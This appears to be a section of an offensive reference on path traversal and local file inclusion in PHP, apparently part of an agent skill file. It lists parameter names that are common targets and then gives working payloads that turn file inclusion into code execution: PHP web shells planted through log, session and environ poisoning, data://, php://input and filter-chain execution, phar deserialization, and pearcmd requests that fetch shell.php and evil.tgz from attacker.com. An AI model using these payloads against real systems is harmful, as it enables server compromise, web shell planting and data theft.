# path-traversal-lfi technical reference

For other original section numbers, use the [entry index](../SKILL.md#references).

## 15. PARAMETER NAMING PATTERNS (HIGH-FREQUENCY TARGETS)

Based on vulnerability research statistical analysis:

| Parameter Name | Frequency | Context |
|---|---|---|
| `filename`, `file`, `path` | Very High | Direct file operations |
| `page`, `include`, `template` | High | Template/page inclusion |
| `url`, `src`, `href` | High | Resource loading |
| `download`, `read`, `load` | Medium | File download/read |
| `dir`, `folder`, `root` | Medium | Directory operations |
| `hdfile`, `inputFile`, `XFileName` | Low | CMS/middleware specific |
| `FileUrl`, `filePath`, `docPath` | Low | Enterprise app specific |

High-frequency vulnerable endpoints:

`down.php`, `download.jsp`, `download.asp`, `readfile.php`, `file_download.php`, `getfile.php`, `view.php`

---

## 16. LFI TO RCE — ESCALATION PATHS

### 1. /proc/self/fd Brute-Force
```
# When file upload exists but path is unknown:
# Uploaded files get temporary fd in /proc/self/fd/
# Brute-force fd numbers:
/proc/self/fd/0 through /proc/self/fd/255
# Include the temp file before it's cleaned up
```

### 2. /proc/self/environ Poisoning
```
# If User-Agent is reflected in process environment:
GET /vuln.php?page=/proc/self/environ
User-Agent: <?php system($_GET['c']); ?>
```

### 3. Log Poisoning
```
# Apache access log:
GET /<?php system($_GET['c']); ?> HTTP/1.1
# Then include: /var/log/apache2/access.log

# SSH auth log (username field):
ssh '<?php system($_GET["c"]); ?>'@target
# Then include: /var/log/auth.log

# Mail log (SMTP subject):
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@target.com>
DATA
Subject: <?php system($_GET['c']); ?>
.
# Then include: /var/log/mail.log
```

### 4. PHP Session File Poisoning
```
# Set session variable to PHP code:
GET /page.php?lang=<?php system($_GET['c']); ?>
# Session file: /tmp/sess_PHPSESSID or /var/lib/php/sessions/sess_PHPSESSID
# Include the session file
```

### 5. phpinfo() Assisted LFI
```
# Race condition: upload via phpinfo() temp file
# 1. POST multipart file to phpinfo() page → reveals tmp_name (/tmp/phpXXXXXX)
# 2. Include the temp file before PHP cleans it up
# Requires many concurrent requests (race window ~10ms)
```

### 6. iconv CVE-2024-2961
```
# glibc iconv buffer overflow in PHP filter chains
# Tool: cfreal/cnext-exploits
# Converts LFI to RCE without needing writable paths or log poisoning
```

---

## 17. PHP WRAPPER EXPLOITATION MATRIX

### php://filter (file read without execution)
```
# Base64 encode source code:
php://filter/convert.base64-encode/resource=index.php

# ROT13:
php://filter/read=string.rot13/resource=index.php

# Chain multiple filters:
php://filter/convert.iconv.UTF-8.UTF-16/resource=index.php

# Zlib compression:
php://filter/zlib.deflate/resource=index.php

# NEW: Filter chain RCE (synacktiv php_filter_chain_generator)
# Generates chains that write arbitrary content via iconv conversions
# Tool: synacktiv/php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
# Produces: php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...|/resource=php://temp
```

### convert.iconv + dechunk Oracle (blind file read)
```
# Error-based oracle: determine if first byte of file matches a character
# Tool: synacktiv/php_filter_chains_oracle_exploit
# Reads files byte-by-byte through error/behavior differences
```

### data:// Wrapper
```
# Execute arbitrary PHP:
data://text/plain,<?php system('id'); ?>
data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==

# Bypass when data:// is filtered but data: (without //) works:
data:text/plain,<?php system('id'); ?>
```

### expect:// Wrapper
```
expect://id
expect://ls
# Requires expect extension (rare but check)
```

### php://input
```
POST /vuln.php?page=php://input
Content-Type: application/x-www-form-urlencoded

<?php system('id'); ?>
```

### zip:// and phar:// Wrappers
```
# zip://: Upload ZIP containing PHP file
zip:///tmp/upload.zip#shell.php

# phar://: Triggers deserialization of phar metadata!
phar:///tmp/upload.phar/anything
# Create malicious phar with crafted metadata object
# Can chain to RCE via POP gadget chains (like PHP deserialization)
# Phar can be disguised as JPG (polyglot phar-jpg)
```

### wrapwrap (prefix/suffix injection)
```
# Tool: ambionics/wrapwrap
# Adds arbitrary prefix and suffix to file content via filter chains
# Useful for converting file read into XXE, SSRF, or deserialization trigger
```

---

## 18. PEARCMD LFI TO RCE

When PEAR is installed and `register_argc_argv=On` (common in Docker PHP images):

```
# Method 1: config-create (write arbitrary content to file)
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/shell.php

# Method 2: man_dir (change docs directory to write path)
GET /index.php?+-c+/tmp/shell.php+-d+man_dir=<?=system($_GET[0])?>+-s+/usr/local/lib/php/pearcmd.php

# Method 3: download (fetch remote file)
GET /index.php?+download+http://attacker.com/shell.php&file=/usr/local/lib/php/pearcmd.php

# Method 4: install (install remote package)
GET /index.php?+install+http://attacker.com/evil.tgz&file=/usr/local/lib/php/pearcmd.php
```

### Windows FindFirstFile Wildcard
```
# Windows << and > wildcards in file paths:
# << matches any extension, > matches single char
include("php<<");      # Matches any .php* file
include("shel>");      # Matches shell.php if only 1 char follows
# Useful when exact filename is unknown
```

---

